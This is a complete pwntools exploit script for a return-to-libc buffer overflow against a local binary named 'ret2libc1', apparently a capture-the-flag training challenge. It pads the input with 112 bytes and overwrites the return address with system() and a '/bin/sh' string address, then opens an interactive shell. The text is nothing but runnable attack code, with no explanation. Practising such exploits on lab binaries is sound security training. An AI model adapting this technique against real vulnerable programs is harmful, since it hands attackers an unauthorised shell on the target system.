from pwn import *
sh=process("./ret2libc1")
system=0x08048460
binsh=0x08048720
payload = b"A"*112+p32(system)+b"B"*4+p32(binsh)
sh.recvuntil(b"RET2LIBC >_<")
sh.sendline(payload)
sh.interactive()

